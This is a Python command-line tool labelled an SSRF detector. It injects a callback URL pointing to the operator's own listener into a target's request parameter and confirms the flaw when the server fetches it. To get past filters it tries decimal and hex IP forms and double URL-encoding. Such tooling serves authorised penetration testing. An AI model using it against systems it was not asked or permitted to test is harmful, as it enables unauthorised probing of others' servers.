import requests
import socket
import argparse
import urllib.parse
import uuid

MODES = ["normal", "decimal", "hex"]
ENCODINGS = ["none", "url", "double"]

def encode_payload(payload, method):
    if method == "url":
        return urllib.parse.quote(payload)
    elif method == "double":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif method == "none":
        return payload
    else:
        print(f"[!] Unknown encoding method: {method}")
        return payload

def ip_to_decimal(ip):
    parts = ip.split(".")
    return str(
        (int(parts[0]) << 24) +
        (int(parts[1]) << 16) +
        (int(parts[2]) << 8) +
        int(parts[3])
    )

def ip_to_hex(ip):
    return "0x" + "".join([format(int(x), "02x") for x in ip.split(".")])

def build_payload(public_ip, port, mode, token):
    if mode == "decimal":
        ip = ip_to_decimal(public_ip)
    elif mode == "hex":
        ip = ip_to_hex(public_ip)
    else:
        ip = public_ip
    return f"http://{ip}:{port}/{token}"

def detect_ssrf(url, param, public_ip, port_number, encoding="none", mode="normal"):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port_number))
    server.listen(1)
    server.settimeout(10)

    print(f"[*] Listening on port {port_number}...")

    try:
        token = str(uuid.uuid4())

        raw_payload = build_payload(public_ip, port_number, mode, token)
        # Only encode once (bug fix: was double-encoding)
        payload = encode_payload(raw_payload, encoding)
        print(f"[*] Sending payload: {payload}")

        try:
            requests.get(url, params={param: payload}, timeout=5)
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error (normal sometimes): {e}")

        print("[*] Waiting for callback...")

        while True:
            try:
                conn, addr = server.accept()
                data = conn.recv(1024).decode(errors='ignore')

                print(f"[+] Connection from {addr}")
                print(data)

                if token in data:
                    print("[+] SSRF confirmed!")
                    conn.close()
                    return True

                conn.close()

            except socket.timeout:
                break

        return False

    except socket.timeout:
        print("[-] No SSRF detected (timeout)")
        return False

    finally:
        server.close()
        print("[*] Server closed")

def main():
    parser = argparse.ArgumentParser(description='SSRF Detector')
    parser.add_argument('url')
    parser.add_argument('param')
    parser.add_argument('public_ip')
    parser.add_argument('port_number', type=int)
    parser.add_argument("-e", "--encode", help="Encoding method (none, url, double)", default="none")
    parser.add_argument("-m", "--mode", help="IP representation mode (normal, decimal, hex)", default=None)
    args = parser.parse_args()

    found = False

    # If mode is specified, only test that mode; otherwise try all
    modes_to_try = [args.mode] if args.mode else MODES

    for mode in modes_to_try:
        for encoding in ENCODINGS:
            print(f"[+] Mode: {mode} | Encoding: {encoding}")

            result = detect_ssrf(
                args.url,
                args.param,
                args.public_ip,
                args.port_number,
                encoding,
                mode
            )

            if result:
                print(f"[+] SSRF confirmed! Mode={mode}, Encoding={encoding}")
                found = True
                return

    if not found:
        print("[-] SSRF not detected")

if __name__ == '__main__':
    main()
